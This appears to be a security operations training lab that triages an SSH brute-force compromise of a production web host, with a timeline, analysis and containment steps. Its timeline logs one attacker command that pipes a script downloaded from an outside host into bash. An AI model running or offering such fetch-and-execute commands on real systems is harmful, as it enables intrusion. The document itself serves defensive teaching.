# SOC Alert Triage Lab: SSH Brute-Force & Compromise Analysis

## 📌 Executive Summary
* **Alert Description:** Multiple failed authentication attempts followed by a successful login from an external IP address.
* **Severity:** High
* **Target System:** `prod-web-01.internal` (`10.0.4.15`)
* **Target Account:** `jadmin`
* **Attacker Source IP:** `198.51.100.45`
* **Incident Status:** Contained & Remediated

---

## ⏱️ Attack Timeline
| Timestamp (UTC) | Event Type | Source IP | User | Details |
|---|---|---|---|---|
| 2026-11-07 14:02:11 | Auth Failure | 198.51.100.45 | jadmin | Failed password (Attempt 1) |
| 2026-11-07 14:02:14 | Auth Failure | 198.51.100.45 | jadmin | Failed password (Attempt 2) |
| 2026-11-07 14:05:30 | Auth Success | 198.51.100.45 | jadmin | Successful interactive SSH login |
| 2026-11-07 14:06:12 | Command Exec | 10.0.4.15 | jadmin | `curl http://198.51.100.45/drop.sh \| bash` |
| 2026-11-07 14:07:00 | Priv Escalation | 10.0.4.15 | root | `sudo su` via unauthorized binary |

---

## 🔍 Investigation & Analysis

### 1. Verification of Compromise
* **Authentication Anomaly:** The account `jadmin` logged in successfully immediately following rapid authentication failure events from an unauthenticated external IP (`198.51.100.45`).
* **Post-Exploitation Activity:** Process creation logs confirmed malicious outbound HTTP requests downloading an external shell script (`drop.sh`) immediately following the successful authentication session.
* **Verdict:** **True Positive — Account Compromise via Brute-Force.**

---

## 🛡️ Containment & Remediation Actions

1. **Host Isolation:** Segregated `prod-web-01` from the network via EDR agent software to prevent lateral movement.
2. **Credential Revocation:** Invalidated active session tokens and forced a password reset for user `jadmin`.
3. **Perimeter Blocking:** Added attacker IP (`198.51.100.45`) to firewall deny-lists.
4. **Forensic Collection:** Pulled volatile memory dumps and auth log artifacts (`/var/log/auth.log`) for deeper post-incident analysis.
